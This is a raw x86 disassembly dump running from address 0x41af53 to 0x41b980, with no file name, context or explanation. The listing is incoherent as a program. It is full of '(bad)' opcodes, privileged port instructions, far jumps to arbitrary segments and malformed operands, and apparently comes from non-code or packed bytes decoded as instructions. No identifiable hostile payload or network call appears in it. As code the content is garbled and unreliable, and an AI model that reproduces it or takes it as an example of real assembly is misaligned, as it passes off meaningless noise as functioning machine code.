  41af53:	and    al,0xe
  41af55:	pop    ebx
  41af56:	jb     0x41afa7
  41af58:	bound  eax,QWORD PTR [edi+0x70]
  41af5b:	aaa    
  41af5c:	pop    edx
  41af5d:	push   ebx
  41af5e:	pusha  
  41af5f:	dec    edi
  41af60:	bound  ecx,QWORD PTR [edi+0x62]
  41af63:	aas    
  41af64:	pop    edx
  41af65:	imul   ebx,DWORD PTR [esi+0x2ddfee56],0xffffffdb
  41af6c:	pop    ebx
  41af6d:	mov    dh,BYTE PTR [esi]
  41af6f:	jmp    0x29eb:0x2c031eb7
  41af76:	jb     0x41af31
  41af78:	(bad)  
  41af79:	mov    dl,0xf
  41af7b:	in     al,dx
  41af7c:	outs   dx,DWORD PTR ds:[esi]
  41af7d:	mov    edx,DWORD PTR [esi]
  41af7f:	cs jg  0x41afdd
  41af82:	pop    esp
  41af83:	mov    ds:0x7ee75b3e,al
  41af88:	cli    
  41af89:	ss iret 
  41af8b:	cs mov al,0x36
  41af8e:	jmp    0x41af93
  41af90:	ds push es
  41af92:	(bad)  
  41af93:	jle    0x41af95
	...
  41afbd:	add    dl,ch
  41afbf:	ss sti 
  41afc1:	jl     0x41af45
  41afc3:	aas    
  41afc4:	not    DWORD PTR [eax-0x74]
  41afc7:	sub    esp,DWORD PTR [edx-0x46]
  41afca:	push   ss
  41afcb:	mov    ss,edi
  41afcd:	jmp    0x7d5be0f5
  41afd2:	or     ch,dl
  41afd4:	and    esp,DWORD PTR [eax]
  41afd6:	bound  esi,QWORD PTR [ebx-0x53]
  41afd9:	cmc    
  41afda:	or     ecx,DWORD PTR [ebx+0x3f5a3862]
  41afe0:	jmp    0xb946:0x34aec7bb
  41afe7:	pop    ss
  41afe8:	retf   
  41afe9:	sbb    ecx,DWORD PTR [esi+edx*8-0x71512363]
  41aff0:	xchg   cl,ch
  41aff2:	(bad)  
  41aff3:	mov    ds:0x431a4072,eax
  41aff8:	add    BYTE PTR [esi],bl
  41affa:	jb     0x41afd0
  41affc:	into   
  41affd:	sbb    DWORD PTR [ebp+0x3b66fd8c],0x3b0d23f7
  41b007:	mov    ds:0x3f49ad89,eax
  41b00c:	cmp    DWORD PTR [edx],ebp
  41b00e:	and    esp,DWORD PTR [edi]
  41b010:	and    al,0xa1
  41b012:	daa    
  41b013:	and    ch,cl
  41b015:	in     eax,0x12
  41b017:	daa    
  41b018:	and    al,0x91
  41b01a:	or     bl,BYTE PTR [edi]
  41b01c:	and    al,0xf1
  41b01e:	push   edx
  41b01f:	loope  0x41b045
  41b021:	in     eax,dx
	...
  41b04a:	add    BYTE PTR [eax],al
  41b04c:	cmp    eax,0xbaf0735b
  41b051:	leave  
  41b052:	sub    ch,ch
  41b054:	cmp    eax,0x3295005b
  41b059:	inc    esi
  41b05a:	add    ah,ch
  41b05c:	cmp    eax,0xbae47c5b
  41b061:	mov    BYTE PTR [edx],al
  41b063:	jge    0x41b088
  41b065:	or     bh,BYTE PTR [ebp+eax*8+0x15]
  41b069:	pop    ebx
  41b06a:	jnp    0x41b055
  41b06c:	cmp    eax,0x266a0307
  41b071:	pop    esp
  41b072:	je     0x41b06e
  41b074:	stos   BYTE PTR es:[edi],al
  41b075:	pop    ss
  41b076:	and    al,0x11
  41b078:	(bad)  
  41b079:	sbb    cl,BYTE PTR [ecx-0xe670a49]
  41b07f:	mov    esi,0x62307426
  41b084:	cmp    DWORD PTR [edi],0x3f416258
  41b08a:	adc    BYTE PTR [edx+0x12],dh
  41b08d:	xor    al,0xd5
  41b08f:	cmp    ecx,DWORD PTR [edx-0x2f7e312c]
  41b095:	mov    bh,ch
  41b097:	mov    ss,esi
  41b099:	push   ds
  41b09a:	and    al,0x0
  41b09c:	neg    esi
  41b09e:	jmp    0x41b0a1
  41b0a0:	retf   0xe77b
  41b0a3:	adc    bl,BYTE PTR [edx+ebx*1+0x24]
  41b0a7:	adc    BYTE PTR [edx+0x47],ah
  41b0aa:	sti    
  41b0ab:	push   ecx
  41b0ac:	cmc    
  41b0ad:	push   es
  41b0ae:	into   
  41b0af:	call   0x41b0b4
	...
  41b0d8:	add    BYTE PTR [eax],al
  41b0da:	xor    eax,0x44fffb8e
  41b0df:	je     0x41b160
  41b0e1:	std    
  41b0e2:	xchg   esp,eax
  41b0e3:	or     BYTE PTR [ecx+eax*4-0x74ffa259],0x19
  41b0eb:	pop    edx
  41b0ec:	add    al,0x0
  41b0ee:	xchg   edi,eax
  41b0ef:	sbb    BYTE PTR [edi+0x50],cl
  41b0f2:	sbb    al,0xc4
  41b0f4:	call   0xfbb50817
  41b0f9:	mov    esp,DWORD PTR [ebx-0x59aad797]
  41b0ff:	push   es
  41b100:	into   
  41b101:	mov    ebp,DWORD PTR [edi]
  41b103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b104:	lock repnz inc eax
  41b107:	jae    0x41b140
  41b109:	ret    
  41b10a:	shl    BYTE PTR [ebp-0x79],1
  41b10d:	inc    esp
  41b10e:	jnp    0x41b175
  41b110:	aaa    
  41b111:	xchg   BYTE PTR [ebx-0x77],bh
  41b114:	std    
  41b115:	call   FWORD PTR [edx+0x4fbe8086]
  41b11b:	pop    ebx
  41b11c:	add    BYTE PTR [eax],al
  41b11e:	pop    ss
  41b11f:	stc    
  41b120:	inc    eax
  41b121:	cmp    eax,0x5c17
  41b126:	sbb    DWORD PTR [edx+0x7f],0xfffffffd
  41b12a:	and    eax,0x173d02f9
  41b12f:	hlt    
  41b130:	(bad)  
  41b131:	call   DWORD PTR [ebx+0x4d]
  41b134:	xchg   DWORD PTR [ebx+ecx*1+0x15],ebx
  41b138:	test   DWORD PTR [ebx+edi*8+0x58],ebp
  41b13c:	sub    ebp,0x0
	...
  41b166:	add    BYTE PTR [eax],al
  41b168:	ds data16 and al,0x89
  41b16c:	enter  0xfd8e,0xff
  41b170:	fldenv [ebp+0x52]
  41b173:	mov    DWORD PTR [eax],eax
  41b175:	jmp    0x41b19a
  41b177:	lock leave 
  41b179:	adc    DWORD PTR [edi+edi*8-0xfe8d3f],ebp
  41b180:	ret    
  41b181:	xchg   ch,bh
  41b183:	push   DWORD PTR [ecx+0x5224406b]
  41b189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b18a:	loope  0x41b117
  41b18c:	add    dh,BYTE PTR [edi-0x1a]
  41b18f:	jmp    0x2489be88
  41b194:	test   BYTE PTR [eax+eax*2],0x24
  41b198:	push   esi
  41b199:	out    0x51,eax
  41b19b:	mov    DWORD PTR [eax+0x1a],esi
  41b19e:	add    ecx,esi
  41b1a0:	jns    0x41b1e3
  41b1a2:	add    ebp,DWORD PTR [esi+0x17e4a]
  41b1a8:	mov    ebx,0x55fd08ce
  41b1ad:	xchg   edi,eax
  41b1ae:	jp     0x41b20c
  41b1b0:	and    bh,BYTE PTR [edx-0x50340280]
  41b1b6:	jp     0x41b204
  41b1b8:	and    bl,BYTE PTR [edx+0x7e2a967a]
  41b1be:	add    DWORD PTR [eax],eax
  41b1c0:	(bad)  
  41b1c1:	sub    eax,0x35c73c20
  41b1c6:	and    BYTE PTR [eax],bh
  41b1c8:	mov    bh,0x45
  41b1ca:	and    BYTE PTR [eax],dl
	...
  41b1f4:	add    BYTE PTR [eax],al
  41b1f6:	jns    0x41b195
  41b1f8:	or     eax,DWORD PTR [ebx+0x45014619]
  41b1fe:	and    eax,0x32867a79
  41b203:	jbe    0x41b206
  41b205:	add    BYTE PTR [ebp+0x62],ch
  41b208:	jns    0x41b1d8
  41b20a:	out    0x5a,al
  41b20c:	pop    ebp
  41b20d:	(bad)  
  41b20e:	xrelease xchg DWORD PTR [esi-0x18a0ad83],ebx
  41b215:	add    edi,DWORD PTR [ebp-0x18802179]
  41b21b:	pop    edx
  41b21c:	out    0x3,eax
  41b21e:	pop    ss
  41b21f:	pop    es
  41b220:	ret    
  41b221:	daa    
  41b222:	cmp    ebx,esi
  41b224:	mov    BYTE PTR [ebx],al
  41b226:	ds pop ebx
  41b228:	bound  ecx,QWORD PTR [edi+0x62]
  41b22b:	das    
  41b22c:	jb     0x41b1e4
  41b22e:	addr16 xchg esp,eax
  41b230:	ins    BYTE PTR es:[edi],dx
  41b231:	push   DWORD PTR [edi]
  41b233:	inc    esp
  41b234:	cs ins DWORD PTR es:[edi],dx
  41b236:	cmp    al,0xd4
  41b238:	es push ebx
  41b23a:	(bad)  
  41b23b:	push   ds
  41b23c:	or     edx,DWORD PTR [eax]
  41b23e:	(bad)  
  41b23f:	jae    0x41b253
  41b241:	xlat   BYTE PTR ds:[ebx]
  41b242:	in     eax,dx
  41b243:	sub    ah,BYTE PTR [edi+esi*1+0x5a]
  41b247:	inc    edi
  41b248:	cwde   
  41b249:	jp     0x41b1d3
  41b24b:	rcl    DWORD PTR [ebx-0x6a8ce5e1],1
  41b251:	lock imul eax,DWORD PTR [edi+0x4f1a67d0],0xffffff99
  41b259:	das    
	...
  41b282:	add    BYTE PTR [eax],al
  41b284:	(bad)  
  41b285:	cs retf 
  41b287:	xor    ebp,ebx
  41b289:	sub    al,0x72
  41b28b:	mov    ch,0x56
  41b28d:	jg     0x41b287
  41b28f:	in     eax,0x43
  41b291:	sar    edi,cl
  41b293:	jns    0x41b217
  41b295:	aas    
  41b296:	pop    ds
  41b297:	dec    ebp
  41b298:	mov    ss,edx
  41b29a:	lods   eax,DWORD PTR ds:[esi]
  41b29b:	fadd   QWORD PTR [esi]
  41b29d:	(bad)  
  41b29e:	(bad)  
  41b29f:	in     eax,0x67
  41b2a1:	mov    al,ds:0x6f625862
  41b2a6:	inc    ebp
  41b2a7:	adc    al,0xc7
  41b2a9:	pop    ss
  41b2aa:	add    esi,DWORD PTR [edi+esi*4]
  41b2ad:	das    
  41b2ae:	add    BYTE PTR ds:0x54cde4e,cl
  41b2b4:	sub    bl,dh
  41b2b6:	push   esp
  41b2b7:	int    0x19
  41b2b9:	aam    0x44
  41b2bb:	lds    ecx,FWORD PTR [ebp+0x30]
  41b2be:	push   ebx
  41b2bf:	cmp    DWORD PTR [edi-0x6b],esp
  41b2c2:	call   0xfdcaa37f
  41b2c7:	jb     0x41b2df
  41b2c9:	aas    
  41b2ca:	cmp    BYTE PTR [esi],dl
  41b2cc:	ins    DWORD PTR es:[edi],dx
  41b2cd:	aam    0xce
  41b2cf:	(bad)  
  41b2d1:	jae    0x41b274
  41b2d3:	js     0x41b278
  41b2d5:	mov    BYTE PTR [ecx],bh
  41b2d7:	sub    al,0x19
  41b2d9:	inc    ecx
  41b2da:	mov    DWORD PTR [ebp+0x6f394349],esp
  41b2e0:	pop    esi
  41b2e1:	pop    edi
  41b2e2:	add    cl,ch
  41b2e4:	sub    BYTE PTR [esi-0x7f],bl
  41b2e7:	xchg   DWORD PTR [eax],eax
	...
  41b311:	add    BYTE PTR [edx],dh
  41b313:	pop    edi
  41b314:	add    cl,ch
  41b316:	cmp    eax,0x3df4180f
  41b31b:	pop    edx
  41b31c:	add    cl,ch
  41b31e:	loope  0x41b379
  41b320:	and    DWORD PTR [esi],0xdc170f3c
  41b326:	cmp    eax,0xd9e90002
  41b32b:	pop    ecx
  41b32c:	or     DWORD PTR [esi],0x9e0b0f3f
  41b332:	in     eax,dx
  41b333:	ror    esi,cl
  41b335:	adc    DWORD PTR [edi+0x76],esp
  41b338:	std    
  41b339:	test   BYTE PTR [esi],0x88
  41b33c:	jmp    0x24396a0a
  41b341:	stc    
  41b342:	xor    BYTE PTR [esi-0x2bc21603],al
  41b348:	rol    DWORD PTR [edx],1
  41b34a:	repz sub BYTE PTR [ebx+0x62],dl
  41b34e:	shl    DWORD PTR [edx-0x3b],cl
  41b351:	add    cl,ch
  41b353:	jle    0x41b350
  41b355:	inc    ebp
  41b356:	xchg   esp,eax
  41b357:	scas   eax,DWORD PTR es:[edi]
  41b358:	std    
  41b359:	je     0x41b355
  41b35b:	add    BYTE PTR [esp+0x17],ch
  41b35f:	add    eax,DWORD PTR [esp+0x33]
  41b363:	sbb    al,0x48
  41b365:	mov    DWORD PTR [ebx],ebp
  41b367:	cmp    ebx,DWORD PTR [eax+0x3b]
  41b36a:	scas   eax,DWORD PTR es:[edi]
  41b36b:	mov    ?,WORD PTR [edi-0x49]
  41b36e:	scas   eax,DWORD PTR es:[edi]
  41b36f:	jle    0x41b36c
  41b371:	test   DWORD PTR [eax+0x9c818e],edi
	...
  41b39f:	add    bh,dl
  41b3a1:	pop    ecx
  41b3a2:	add    BYTE PTR [ebx-0x79f4a6b8],al
  41b3a8:	and    al,0x5a
  41b3aa:	add    BYTE PTR [eax],al
  41b3ac:	sub    al,0x4e
  41b3ae:	and    al,0x10
  41b3b0:	lock add bh,BYTE PTR [edi+0x4d2a502b]
  41b3b7:	mov    edi,DWORD PTR [ecx]
  41b3b9:	mov    ds:0x7ef8ee2b,al
  41b3be:	xchg   DWORD PTR [ebx+eax*2+0x37],edx
  41b3c2:	push   ebx
  41b3c3:	push   edx
  41b3c4:	sbb    al,0xd0
  41b3c6:	xchg   eax,ebp
  41b3c8:	call   FWORD PTR [eax-0x13]
  41b3cb:	call   FWORD PTR [eax]
  41b3cd:	xor    eax,ecx
  41b3cf:	jg     0x41b373
  41b3d1:	add    al,BYTE PTR [esp-0x71]
  41b3d5:	xor    al,BYTE PTR [esi+0x596324]
  41b3db:	jne    0x41b42b
  41b3dd:	fidivr DWORD PTR [esi+0x596328]
  41b3e3:	add    bl,al
  41b3e5:	push   ecx
  41b3e6:	cmp    DWORD PTR [eax],eax
  41b3e8:	and    bl,BYTE PTR [ecx+0x0]
  41b3eb:	jl     0x41b40f
  41b3ed:	fdivp  st(3),st
  41b3ef:	add    dl,BYTE PTR [ebx+0x3e003933]
  41b3f5:	das    
  41b3f6:	add    al,0x0
  41b3f8:	call   0xfc46:0x3dfd867f
  41b3ff:	push   esp
  41b400:	outs   dx,BYTE PTR ds:[esi]
  41b401:	or     edx,edx
  41b403:	call   0x41b408
	...
  41b42c:	add    BYTE PTR [eax],al
  41b42e:	ja     0x41b3f3
  41b430:	loope  0x41b42f
  41b432:	in     eax,0x8c
  41b434:	inc    eax
  41b435:	pop    ecx
  41b436:	xchg   ecx,eax
  41b437:	icebp  
  41b438:	retf   
  41b439:	std    
  41b43a:	mov    cl,dh
  41b43c:	(bad)  
  41b43d:	cmp    ah,bh
  41b43f:	mov    al,BYTE PTR [ecx]
  41b441:	mov    DWORD PTR [edx-0x62],ebp
  41b444:	icebp  
  41b445:	mov    ch,bh
  41b447:	test   eax,0x97350ca
  41b44c:	shr    al,cl
  41b44e:	and    esp,ebx
  41b450:	loope  0x41b44f
  41b452:	add    esi,ecx
  41b454:	lock jmp FWORD PTR [edx]
  41b457:	das    
  41b458:	in     eax,dx
  41b459:	adc    BYTE PTR [ebp-0x4cefda32],dh
  41b45f:	mov    ecx,0xf8ec4fe2
  41b464:	shr    eax,1
  41b466:	cmp    DWORD PTR [ecx+eiz*8],ebp
  41b469:	std    
  41b46a:	mov    ch,0xc6
  41b46c:	and    eax,0x173c354
  41b471:	add    BYTE PTR [esi],bh
  41b473:	mov    edx,eax
  41b475:	jno    0x41b496
  41b477:	(bad)  
  41b479:	add    BYTE PTR [esi],bh
  41b47b:	jb     0x41b47e
  41b47d:	mov    DWORD PTR [eax+0x3e000586],edi
  41b483:	shl    DWORD PTR [ecx],0x89
  41b486:	sub    BYTE PTR [edx-0x19],0xeb
  41b48a:	dec    ecx
  41b48b:	test   DWORD PTR [esi+ebp*4],eax
  41b48e:	sub    dh,BYTE PTR [esi+0x1]
	...
  41b4b9:	add    BYTE PTR [eax],al
  41b4bb:	add    BYTE PTR ds:0xacdd1d57,bh
  41b4c1:	pop    ebx
  41b4c2:	int3   
  41b4c3:	xchg   bh,dh
  41b4c5:	sub    eax,0xffffff81
  41b4c8:	inc    edx
  41b4c9:	pop    edi
  41b4ca:	out    0x3,eax
  41b4cc:	lds    ecx,FWORD PTR [edi]
  41b4ce:	loopne 0x41b528
  41b4d0:	sub    eax,edx
  41b4d2:	ins    DWORD PTR es:[edi],dx
  41b4d3:	repz cmp eax,0xb88ce75b
  41b4d9:	(bad)  
  41b4da:	jmp    0x41b4df
  41b4dc:	sbb    esp,DWORD PTR ds:[eax-0x6f]
  41b4e0:	push   edx
  41b4e1:	pop    edi
  41b4e2:	out    0x3,eax
  41b4e4:	rcr    esp,0xf7
  41b4e7:	pop    es
  41b4e8:	ds pop ebx
  41b4ea:	bound  ecx,QWORD PTR [ecx+0x3e75f36]
  41b4f0:	les    ebp,FWORD PTR [edx-0x17]
  41b4f3:	mov    ch,0xc8
  41b4f5:	cwde   
  41b4f6:	outs   dx,DWORD PTR ds:[esi]
  41b4f7:	repz shl ch,0xd3
  41b4fb:	pop    es
  41b4fc:	ds pop ebx
  41b4fe:	hlt    
  41b4ff:	cld    
  41b500:	(bad)  
  41b501:	fdivr  st(7),st
  41b503:	pop    es
  41b504:	ds pop ebx
  41b506:	jo     0x41b491
  41b508:	inc    esi
  41b509:	pop    edi
  41b50a:	out    0x3,eax
  41b50c:	(bad)  
  41b50d:	rcr    DWORD PTR [ebp-0x1],1
  41b510:	cmp    eax,0xc08ce75b
  41b515:	push   0xffffffe3
  41b517:	add    edi,DWORD PTR [esi]
  41b519:	shr    BYTE PTR [ebp-0x5],1
  41b51c:	cmp    eax,0x8de75b
	...
  41b549:	add    BYTE PTR [esi+0x59],cl
  41b54c:	cmp    ecx,esp
  41b54e:	jl     0x41b522
  41b550:	test   DWORD PTR [eax+eax*8],0x3e03eb66
  41b557:	push   cs
  41b558:	lock mov ?,WORD PTR [eax+0x3e03eb6a]
  41b55f:	shl    BYTE PTR [ebp-0x5],cl
  41b562:	cmp    eax,0x7de9005b
  41b567:	fimul  DWORD PTR [esi+0x5b39cd]
  41b56d:	jo     0x41b523
  41b56f:	imul   eax,DWORD PTR [ecx+ebp*8],0x3d
  41b573:	aam    0x86
  41b575:	icebp  
  41b576:	inc    ecx
  41b577:	pop    ebx
  41b578:	add    BYTE PTR [ecx-0x26792ba6],bh
  41b57e:	inc    ecx
  41b57f:	pop    ebx
  41b580:	add    BYTE PTR [edi+0x67895b3a],ah
  41b586:	ds push edi
  41b588:	add    cl,ch
  41b58a:	ret    0x18d9
  41b58d:	in     eax,dx
  41b58e:	cmp    eax,0xea4eff5b
  41b593:	pop    esi
  41b594:	add    cl,ch
  41b596:	sub    dl,BYTE PTR [esi+0x17c2c9d2]
  41b59c:	and    al,0x25
  41b59e:	rcr    DWORD PTR [ebx+0xfb2b874],0x24
  41b5a5:	or     ebx,ecx
  41b5a7:	jmp    0x5b7f9abc
  41b5ac:	sub    DWORD PTR [ebp+0x0],edi
	...
  41b5d6:	add    BYTE PTR [eax],al
  41b5d8:	popa   
  41b5d9:	sub    ecx,DWORD PTR [edi+0x72]
  41b5dc:	int3   
  41b5dd:	addr16 add al,0xe9
  41b5e0:	cmp    eax,0x4a054c34
  41b5e5:	sub    eax,0xab9e9e4f
  41b5ea:	and    DWORD PTR ds:0xbcc0dd8a,0x2a892649
  41b5f4:	xor    esp,DWORD PTR [eax]
  41b5f6:	pop    esi
  41b5f7:	push   0x76
  41b5f9:	inc    ebx
  41b5fa:	ret    0x3a01
  41b5fd:	aam    0x86
  41b5ff:	stc    
  41b600:	inc    ecx
  41b601:	pop    ebx
  41b602:	add    dl,al
  41b604:	stc    
  41b605:	ss push eax
  41b607:	add    BYTE PTR [edx-0x2ba1a4c1],ah
  41b60d:	xchg   edx,eax
  41b60e:	cmp    dl,al
  41b610:	divps  xmm7,XMMWORD PTR [eax+0x502700]
  41b617:	ret    
  41b618:	lods   al,BYTE PTR ds:[esi]
  41b619:	sbb    ah,BYTE PTR [esp+eax*1]
  41b61c:	lods   al,BYTE PTR ds:[esi]
  41b61d:	xchg   esi,eax
  41b61e:	mov    ebp,0x44d124e9
  41b623:	or     BYTE PTR [edi-0x68],ah
  41b626:	xchg   DWORD PTR [ebx+edi*1+0x6b],eax
  41b62a:	jge    0x41b618
  41b62c:	xor    edx,DWORD PTR [ebx+0x0]
  41b62f:	add    BYTE PTR [edx-0x62],ch
  41b632:	jno    0x41b63b
  41b634:	call   0x5dd7:0x42c
  41b63a:	mov    edi,0x8b
	...
  41b663:	add    BYTE PTR [eax],al
  41b665:	add    BYTE PTR [ebx+0x3a],dl
  41b668:	inc    esp
  41b669:	add    al,0xe7
  41b66b:	pop    ebp
  41b66c:	xchg   DWORD PTR [ebx+edi*8-0x28fffbe3],edx
  41b673:	dec    esp
  41b674:	xchg   DWORD PTR [ebx+edi*8-0x58fffbe3],ecx
  41b67b:	inc    edi
  41b67c:	xchg   DWORD PTR [ebx+edi*2-0x68fffb9f],edx
  41b683:	dec    esp
  41b684:	push   eax
  41b685:	mov    ebx,DWORD PTR [ebx]
  41b687:	cmp    al,BYTE PTR [eax+0x4]
  41b68a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b68b:	pop    ebp
  41b68c:	push   edx
  41b68d:	push   eax
  41b68e:	repnz adc DWORD PTR [eax+ebx*1],esp
  41b692:	out    dx,eax
  41b693:	dec    ebp
  41b694:	icebp  
  41b695:	inc    DWORD PTR [eax-0x23]
  41b698:	les    ebp,FWORD PTR [ebx+ebp*2]
  41b69b:	pop    ebp
  41b69c:	add    bl,al
  41b69e:	push   ebx
  41b69f:	xchg   edx,eax
  41b6a0:	int3   
  41b6a1:	int3   
  41b6a2:	xor    edx,DWORD PTR [edx-0x6dec3334]
  41b6a8:	int3   
  41b6a9:	int3   
  41b6aa:	ds mov edi,0x7fbfe38a
  41b6b0:	rol    BYTE PTR [eax],cl
  41b6b2:	ds je  0x41b6e9
  41b6b5:	push   esi
  41b6b6:	jmp    0x6f49ecc7
  41b6bb:	ins    DWORD PTR es:[edi],dx
  41b6bc:	adc    BYTE PTR [esi+0x3f57e6ed],dh
  41b6c2:	ds or  edx,esp
  41b6c5:	mov    edi,0xb60e7626
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	inc    edx
  41b6f5:	or     BYTE PTR [edi+ebp*8+0xd0593bd],0xd1
  41b6fd:	push   es
  41b6fe:	or     esp,esp
  41b700:	mov    esi,DWORD PTR [ebx]
  41b702:	add    al,0x83
  41b704:	push   es
  41b705:	jp     0x41b77f
  41b707:	iret   
  41b708:	inc    ecx
  41b709:	or     bl,al
  41b70b:	mov    BYTE PTR [edx-0x42be33a9],al
  41b711:	mov    ebp,0xa3ef7c1c
  41b716:	scas   eax,DWORD PTR es:[edi]
  41b717:	mov    bp,0x104f
  41b71b:	call   DWORD PTR [edx-0x74]
  41b71e:	mov    eax,ss
  41b720:	leave  
  41b721:	mov    edx,0xa83e4c8f
  41b726:	jmp    0x278a:0xef9ec301
  41b72d:	jae    0x41b6b1
  41b72f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b730:	jecxz  0x41b6b4
  41b732:	fdivp  st(5),st
  41b734:	cdq    
  41b735:	jb     0x41b6b9
  41b737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b738:	ret    
  41b739:	sbb    dh,0xfd
  41b73c:	mov    DWORD PTR [edx+0x14],esi
  41b73f:	fnstenv [ecx]
  41b741:	or     BYTE PTR [edx+0x1b2f08c],al
  41b747:	mov    ebp,DWORD PTR [edx]
  41b749:	stos   BYTE PTR es:[edi],al
  41b74a:	cmp    dh,0x4a
  41b74d:	pop    ebx
  41b74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b74f:	or     DWORD PTR [edi+edx*1+0x17c6cbd4],esi
  41b756:	hlt    
  41b757:	jae    0x41b759
	...
  41b781:	add    BYTE PTR [edi+0x53],ah
  41b784:	popa   
  41b785:	dec    eax
  41b786:	or     eax,0x25486faf
  41b78b:	jmp    0x41b737
  41b78d:	xor    BYTE PTR [edi],0x5f
  41b790:	jae    0x41b74e
  41b792:	neg    DWORD PTR [esi-0x19]
  41b795:	add    edi,DWORD PTR [esi]
  41b797:	push   eax
  41b798:	popf   
  41b799:	xor    DWORD PTR [edx-0x3afbd7f8],0x1082ef46
  41b7a3:	inc    ebx
  41b7a4:	dec    esp
  41b7a5:	or     dh,BYTE PTR [esi+edx*1+0x16b6cbfc]
  41b7ac:	fdiv   QWORD PTR [ebx-0x19]
  41b7af:	push   edx
  41b7b0:	popa   
  41b7b1:	inc    edi
  41b7b2:	sub    eax,0x45475faf
  41b7b7:	jmp    0x41b7e3
  41b7b9:	and    edi,0x42
  41b7bc:	sbb    edi,DWORD PTR [ebp-0x6a195bd7]
  41b7c2:	mov    edi,0x3e4515de
  41b7c7:	fild   DWORD PTR [ebx]
  41b7c9:	or     DWORD PTR [esi-0x38f20ca6],ebp
  41b7cf:	push   esi
  41b7d0:	push   esp
  41b7d1:	xlat   BYTE PTR ds:[ebx]
  41b7d2:	sub    eax,0xc20ce71a
  41b7d7:	int    0xf7
  41b7d9:	fisub  WORD PTR [ebx-0x406a1181]
  41b7df:	(bad)  
  41b7e0:	fld    QWORD PTR [esi+edi*1-0x25]
  41b7e4:	retf   
  41b7e5:	or     BYTE PTR [eax],al
	...
  41b80f:	add    BYTE PTR [esi-0x48f244a6],ch
  41b815:	push   esi
  41b816:	pop    esp
  41b817:	xlat   BYTE PTR ds:[ebx]
  41b818:	in     eax,dx
  41b819:	sbb    DWORD PTR [eax],eax
  41b81b:	jmp    0xd9fd8f62
  41b820:	mov    BYTE PTR [ebp-0x3],bh
  41b823:	stos   BYTE PTR es:[edi],al
  41b824:	mov    esp,0x7f9d1881
  41b829:	sbb    al,0x81
  41b82b:	adc    ecx,DWORD PTR [ebp+0x4e]
  41b82e:	mov    ebx,ss
  41b830:	push   0xb674fd7d
  41b835:	push   0xfffffffd
  41b837:	(bad)  
  41b838:	sbb    ebp,DWORD PTR [eax+ebp*8]
  41b83b:	loopne 0x41b87a
  41b83d:	pop    ebx
  41b83e:	add    BYTE PTR [esi-0x2a78db95],cl
  41b844:	popa   
  41b845:	cdq    
  41b846:	or     cl,ch
  41b848:	push   eax
  41b849:	(bad)  
  41b84a:	jecxz  0x41b8b4
  41b84c:	push   cs
  41b84d:	fadd   QWORD PTR [eax]
  41b84f:	jmp    0x1e97e491
  41b854:	mov    bh,0x1a
  41b856:	or     BYTE PTR [ecx+esi*1-0x25],ch
  41b85a:	mov    bh,0xd9
  41b85c:	cmp    eax,0xff60005b
  41b861:	fadd   st(0),st
  41b863:	in     eax,dx
  41b864:	mov    dh,0x4c
  41b866:	jg     0x41b7ef
  41b868:	inc    edx
  41b869:	pop    ebx
  41b86a:	cld    
  41b86b:	jmp    0x62482e6c
  41b870:	daa    
  41b871:	(bad)  
  41b872:	in     al,0xa9
	...
  41b89c:	add    BYTE PTR [eax],al
  41b89e:	xor    ebx,DWORD PTR [ebx+0x0]
  41b8a1:	test   al,0xa3
  41b8a3:	push   ecx
  41b8a4:	pop    es
  41b8a5:	ja     0x41b86e
  41b8a7:	inc    ebx
  41b8a8:	jg     0x41b830
  41b8aa:	inc    edx
  41b8ab:	pop    ebx
  41b8ac:	cld    
  41b8ad:	jmp    0xf04c292e
  41b8b2:	jnp    0x41b88a
  41b8b4:	xor    ah,BYTE PTR [eax-0x38]
  41b8b7:	fadd   st(2),st
  41b8b9:	in     eax,0xb6
  41b8bb:	inc    ebx
  41b8bc:	jg     0x41b8be
  41b8be:	lock xchg esi,eax
  41b8c0:	or     eax,DWORD PTR [eax]
  41b8c2:	addr16 cdq 
  41b8c4:	jmp    0x41b8cc
  41b8c6:	pop    esp
  41b8c7:	pusha  
  41b8c8:	test   DWORD PTR [esi],edi
  41b8ca:	fsubr  QWORD PTR [ebx+0x7d]
  41b8cd:	out    0x57,al
  41b8cf:	stos   BYTE PTR es:[edi],al
  41b8d0:	(bad)  
  41b8d1:	jmp    DWORD PTR [esi]
  41b8d3:	jne    0x41b8e1
  41b8d5:	mov    ecx,DWORD PTR [ebx+ebx*8-0x21]
  41b8d9:	aas    
  41b8da:	push   ss
  41b8db:	jl     0x41b8ed
  41b8dd:	or     DWORD PTR [ecx],ebx
  41b8df:	aam    0x18
  41b8e1:	add    DWORD PTR [edi+edx*2-0x10],0xe7992703
  41b8e9:	add    al,0x1e
  41b8eb:	rol    BYTE PTR [ebp+0x7fcbae32],0xc2
  41b8f2:	and    edx,ebx
  41b8f4:	xor    BYTE PTR [ebx+0x33075f01],al
  41b8fa:	sahf   
  41b8fb:	imul   eax,DWORD PTR [ebp-0x7d],0xffffffd7
  41b8ff:	push   ebp
  41b900:	or     ecx,0x0
	...
  41b92a:	add    BYTE PTR [eax],al
  41b92c:	xor    dl,ch
  41b92e:	mov    DWORD PTR [ebp+0x67],eax
  41b931:	dec    edx
  41b932:	call   0x9b905e
  41b937:	pop    edi
  41b938:	jns    0x41b97e
  41b93a:	test   esp,ebp
  41b93c:	sbb    bl,BYTE PTR [ecx+0x165c0004]
  41b942:	and    al,0x4
  41b944:	ins    DWORD PTR es:[edi],dx
  41b945:	push   cs
  41b946:	je     0x41b989
  41b948:	xlat   BYTE PTR ds:[ebx]
  41b949:	ror    BYTE PTR [edx],cl
  41b94b:	mov    DWORD PTR [edi+0x2404c2da],ebp
  41b951:	call   0x4174:0x8e2d8104
  41b958:	xchg   edi,eax
  41b959:	sub    ebp,esi
  41b95b:	ret    0x59a3
  41b95e:	xchg   DWORD PTR [esi+edi*1+0x50],eax
  41b962:	or     BYTE PTR [edx+0x42a7fa],bh
  41b968:	mov    ch,0x8b
  41b96a:	mov    cl,BYTE PTR [edx]
  41b96c:	mov    ebp,0x7c810533
  41b971:	outs   dx,DWORD PTR ds:[esi]
  41b972:	cmp    dl,0x7a
  41b975:	mov    DWORD PTR [edx+0x0],0x4bf65ec
  41b97c:	ds (bad) 
  41b97e:	mov    ah,bl
  41b980:	out    dx,al
